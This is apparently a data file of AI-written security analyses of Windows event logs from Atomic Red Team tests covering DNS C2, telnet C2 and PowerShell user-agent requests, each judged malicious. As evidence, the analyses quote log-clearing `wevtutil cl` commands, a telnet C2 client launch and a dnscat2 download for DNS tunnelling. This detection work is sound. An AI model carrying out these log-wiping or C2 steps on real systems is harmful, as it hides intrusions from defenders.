Given the information reviewed, the conclusion leans towards the resolution of **MALICIOUS**, primarily due to the clearing of critical system logs, which coupled with unauthorized execution of scripts, constitutes clear signs of potential system compromise."
DNS C2,"Upon reviewing the provided Windows event logs, several suspicious activities have been identified, indicative of potential malicious actions. Below is an analysis of the key log entries that highlight suspicious behavior:

### Suspicious and Anomalous Behavior:

1. **Event Clearing**: 
   - **Security Log Event 1102**: The log indicates that the security log was cleared by the user `admin_test`. Clearing event logs can be a sign of an attempt to cover tracks and is considered highly suspicious behavior in a security context.
   - **System Log Event 104**: Both System and PowerShell logs were cleared by `admin_test`, which further adds to the suspicion that audit trails are being erased intentionally.

2. **PowerShell Execution**:
   - **PowerShell Log Event ID 600 to 800**: These logs show that a PowerShell script was executed which includes the download and execution of a script from a remote location (`https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell`). This specific script appears to be part of the dnscat2 tool, commonly used for creating covert communication channels.
   - The command-line arguments indicate that the script attempts to establish a command and control (C2) channel, which is a known technique used by attackers to maintain persistent access.

3. **Process Execution**:
   - **Sysmon Log Events**: Multiple `wevtutil.exe` executions for clearing logs are recorded. The combination of this tool usage with the cleared logs supports the hypothesis of obfuscation efforts.
   - **Unexpected Use of System Tools**: The command line utilization of `nslookup`, `whoami`, and other network utilities in the context of the PowerShell session suggests possible reconnaissance activities typical in lateral movement stages of an attack.

4. **Network-Related Events**:
   - The execution of `dnscat2` suggests malicious intent as it is often utilized to bypass regular network controls through DNS-based tunneling.

### Assessment and Resolution:

The identified activities within the logs, particularly the execution of a known tool for establishing persistent communication channels and the clearing of audit logs by an administrative user, strongly suggest malicious activity. These actions align with known attack vectors aiming at stealth and persistence through network misconfiguration and system manipulation.

Given the severity and nature of the events identified:

- **Resolution: MALICIOUS**

### Recommendations:

1. **Immediate Containment**: Isolate the affected system (`Server002`) from the network to prevent further actions by attackers.
2. **Forensic Analysis**: Conduct a full forensic investigation on the affected system and review any associated systems for similar indicators of compromise.
3. **Credentials Review**: Reset credentials, especially administrative ones, to ensure that compromised credentials are not used for further attacks.

5. **Patch and Update**: Ensure all systems are up to date with the latest security patches to prevent exploitation by known vulnerabilities.
6. **User Training**: Conduct training sessions to improve user awareness regarding phishing and the importance of reporting suspicious activities promptly.

The logs strongly suggest that the system has been compromised and is being used in a manner consistent with an active breach."
Telnet C2,"Based on the provided Windows event logs, the investigation reveals several indicators of potentially malicious activities. Here's a detailed analysis:

1. **PowerShell Execution**: The logs show multiple executions of PowerShell with an unusual command line that includes executing a telnet client from a temporary directory associated with the Atomic Red Team (likely a penetration testing or adversary simulation framework):
   - `powershell.exe & {C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1071\bin\telnet_client.exe 127.0.0.1 --port 23}`
   This indicates potentially suspicious behavior as it involves direct execution of a binary from a temporary directory using PowerShell, a common vector for executing obfuscated or malicious payloads.

2. **Event Log Clearing**: The Security logs (Event ID 1102) and the System logs (Event ID 104) indicate that logs have been cleared. This is often a sign of malicious activity as attackers may clear logs to cover their tracks and prevent detection.

3. **Sysmon Logs**: Multiple `wevtutil.exe` executions to clear event logs:
   - `""C:\\Windows\\system32\\wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational`
   - `""C:\\Windows\\system32\\wevtutil.exe"" cl Application`
   - `""C:\\Windows\\system32\\wevtutil.exe"" cl System`
   - `""C:\\Windows\\system32\\wevtutil.exe"" cl Security`
   This further corroborates the likelihood of log clearing by someone with potentially malicious intent to obscure activity.

4. **Administrative Context**: The actions are executed by the `admin_test` account, indicating these occur under a privileged context. The manipulation of logs and execution of potentially suspicious PowerShell commands under this context heightens the severity of the observed activity.

5. **EdgeUpdate Executions**: Various `MicrosoftEdgeUpdate.exe` processes run as `NT AUTHORITY\SYSTEM` which is a regular occurrence for system updates. However, this coinciding timing with other suspicious activities could suggest a method of persistence or stealth.

**Assessment**:
The combination of PowerShell execution with unusual and potentially suspicious command lines, coupled with the clearing of event logs which is a common tactic to hide malicious activities, indicates potential malicious activity. This activity needs further investigation to determine the full scope of the compromise, including:
- Investigating the source and intent of the Atomic Red Team files.
- Determining the origin and timeline of the `admin_test` account activities.
- Verifying if legitimate administrative tasks or automated security tests caused these entries.
- Inspecting other systems for similar activity patterns.

**Resolution**: Given the context and findings, the logs are categorized as **MALICIOUS** due to the indicators of log tampering and suspicious process executions involving utilities typically associated with security testing or malicious exploitation. Immediate action should be taken to isolate the host for further forensic investigation."
Malicious User Agents - Powershell,"## Detailed Analysis of Logs

### Anomalies and Suspicious Activities Identified

1. **Log File Clearing**:
   - Several logs indicate the clearing of event logs using the `wevtutil.exe cl` (clear log) command, including system, application, and security logs.
   - This operation was executed by the `admin_test` user at a high integrity level, which is suspicious unless explicitly authorized as part of routine operations.

2. **Frequent use of `wevtutil.exe`**:
   - The use of `wevtutil.exe` for clearing logs is concerning, especially as it seems coordinated across multiple event logs at similar timestamps. Clearing logs could be attempted to cover tracks of other activities.

3. **PowerShell Invoke-WebRequest Command**:
   - Multiple `Invoke-WebRequest` commands to fetch the same URL (`www.google.com`) with various user-agent strings executed via PowerShell could be indicative of a script running checks or a reconnaissance activity.
   - The format of these requests seems consistent with a potentially malicious script running tests or attempting to profile network or endpoint response by emulating different browsers.

4. **Repeated Microsoft Edge Installation**:
   - Numerous entries of `setup.exe` related to Microsoft Edge update process show legitimate activity associated with system-level installations or updates. While this might raise a flag, it's also possible that it's simply an automatic update running with regular parameters.

### Indicators of Malicious Activity

- **Clearing Event Logs**: Common technique used by adversaries to erase evidence of their activities. This is a strong indication that other logs might have been erased to hide malicious actions on the system.
- **PowerShell Commands Execution**: Executing PowerShell scripts with multiple web requests without an obvious reason raises an alarm for potential malicious scripts trying to assess or contact external resources.
- **Repeated and Possibly Unnecessary `setup.exe` Execution**: While Microsoft Edge updates can be legitimate, if these updates aren't aligned with corporate IT schedules, they might need closer review for impersonation or tampered setups.
